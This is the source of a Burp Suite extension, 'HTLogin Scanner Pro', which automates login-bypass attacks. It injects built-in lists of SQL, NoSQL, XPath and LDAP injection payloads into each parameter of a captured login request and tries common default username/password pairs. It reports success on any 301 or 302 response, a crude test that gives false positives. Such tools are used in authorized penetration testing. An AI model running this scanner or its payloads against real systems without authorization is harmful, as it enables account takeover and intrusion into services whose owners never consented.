# -*- coding: utf-8 -*-
from burp import IBurpExtender, ITab, IContextMenuFactory
from javax.swing import JMenuItem, JTextArea, JScrollPane, JPanel, JLabel, JButton
from java.awt import BorderLayout, FlowLayout, Color, Font
from java.util import ArrayList
import threading

class BurpExtender(IBurpExtender, ITab, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("HTLogin Scanner Pro")

        # --- FULL ORIGINAL PAYLOADS ---
        self.PAYLOADS = {
            "SQL Injection": [
                "' OR '1'='1", "admin' --", "admin' #", "admin'/*",
                "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*",
                "admin' OR '1'='1", "admin' OR '1'='1' --",
                "admin' OR '1'='1' #", "admin' OR '1'='1'/*"
            ],
            "NoSQL Injection": [
                '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}',
                '{"$in": [null, ""]}', '{"$exists": true}'
            ],
            "XPath Injection": [
                "' or '1'='1", "' or ''='", "' or 1]%00", "' or /* or '",
                "' or \"a\" or '", "' or 1 or '", "' or true() or '",
                "'or string-length(name(.))<10 or'", "'or contains(name,'adm') or'",
                "'or contains(.,'adm') or'", "'or position()=2 or'",
                "admin' or '", "admin' or '1'='2"
            ],
            "LDAP Injection": [
                "*", "*)(&", "*)(|(&", "pwd)", "*)(|(*", "*))%00",
                "admin)(&)", "pwd", "admin)(!(&(|", "pwd))", "admin))(|(|"
            ]
        }

        self.DEFAULT_CREDS = [
            "admin:admin", "admin:password", "admin:password123",
            "admin:passw0rd", "admin:", "admin:12345", "administrator:password"
        ]

        # Initialize UI
        self.init_ui()
        
        # Register components
        callbacks.addSuiteTab(self)
        callbacks.registerContextMenuFactory(self)
        
        print("HTLogin Scanner Pro: UI updated with Clear button.")

    def init_ui(self):
        # Main Panel
        self.main_panel = JPanel(BorderLayout())
        
        # Top Control Panel
        top_panel = JPanel(FlowLayout(FlowLayout.LEFT))
        
        top_panel.add(JLabel("Status: "))
        self.status_label = JLabel("Ready")
        self.status_label.setForeground(Color(0, 102, 204))
        top_panel.add(self.status_label)
        
        # --- NEW CLEAR BUTTON ---
        btn_clear = JButton("Clear Logs", actionPerformed=self.clear_logs)
        top_panel.add(btn_clear)
        
        # Console Area
        self.log_area = JTextArea(25, 80)
        self.log_area.setFont(Font("Monospaced", Font.PLAIN, 12))
        self.log_area.setEditable(False)
        self.log_area.setBackground(Color(245, 245, 245))
        
        scroll_pane = JScrollPane(self.log_area)
        
        self.main_panel.add(top_panel, BorderLayout.NORTH)
        self.main_panel.add(scroll_pane, BorderLayout.CENTER)

    def log(self, text):
        self.log_area.append(text + "\n")
        self.log_area.setCaretPosition(self.log_area.getDocument().getLength())

    def clear_logs(self, event):
        self.log_area.setText("")
        self.status_label.setText("Logs cleared.")

    # ITab implementation
    def getTabCaption(self):
        return "HTLogin Pro"

    def getUiComponent(self):
        return self.main_panel

    # Context Menu implementation
    def createMenuItems(self, invocation):
        self._invocation = invocation
        menu_list = ArrayList()
        menu_list.add(JMenuItem("Run HTLogin Scanner", actionPerformed=self.start_scan))
        return menu_list

    def start_scan(self, event):
        messages = self._invocation.getSelectedMessages()
        if messages:
            self.status_label.setText("Scanning...")
            threading.Thread(target=self.run_logic, args=(messages[0],)).start()

    def run_logic(self, messageInfo):
        request_info = self._helpers.analyzeRequest(messageInfo)
        url = request_info.getUrl()
        params = request_info.getParameters()
        
        self.log("\n" + "="*70)
        self.log("[*] TARGET: " + str(url))
        self.log("[*] Analyzing " + str(len(params)) + " parameters.")
        self.log("="*70)

        # 1. Injection Tests
        for category, payloads in self.PAYLOADS.items():
            self.log("\n[>] Testing: " + category)
            for payload in payloads:
                for param in params:
                    if param.getType() in [0, 1]:
                        new_param = self._helpers.buildParameter(param.getName(), payload, param.getType())
                        new_req = self._helpers.updateParameter(messageInfo.getRequest(), new_param)
                        
                        req_resp = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), new_req)
                        self._callbacks.addToSiteMap(req_resp)
                        
                        if self.is_success(req_resp):
                            self.log("[!!!] SUCCESS: " + category)
                            self.log("      Param: " + param.getName())
                            self.log("      Payload: " + payload)

        # 2. Default Credentials
        self.log("\n[>] Testing Default Credentials...")
        user_p = self.find_param(params, ["user", "username", "email", "login"])
        pass_p = self.find_param(params, ["pass", "password", "pwd"])
        
        if user_p and pass_p:
            for cred in self.DEFAULT_CREDS:
                u, p = cred.split(":", 1)
                req = self._helpers.updateParameter(messageInfo.getRequest(), 
                      self._helpers.buildParameter(user_p.getName(), u, user_p.getType()))
                req = self._helpers.updateParameter(req, 
                      self._helpers.buildParameter(pass_p.getName(), p, pass_p.getType()))
                
                resp = self._callbacks.makeHttpRequest(messageInfo.getHttpService(), req)
                self._callbacks.addToSiteMap(resp)
                
                if self.is_success(resp):
                    self.log("[!!!] SUCCESS: Default Credentials Found -> " + cred)

        self.log("\n[V] Scan finished.")
        self.status_label.setText("Completed.")

    def is_success(self, rr):
        if not rr.getResponse(): return False
        resp_info = self._helpers.analyzeResponse(rr.getResponse())
        return resp_info.getStatusCode() in [302, 301]

    def find_param(self, params, names):
        for p in params:
            if any(n in p.getName().lower() for n in names):
                return p
        return None
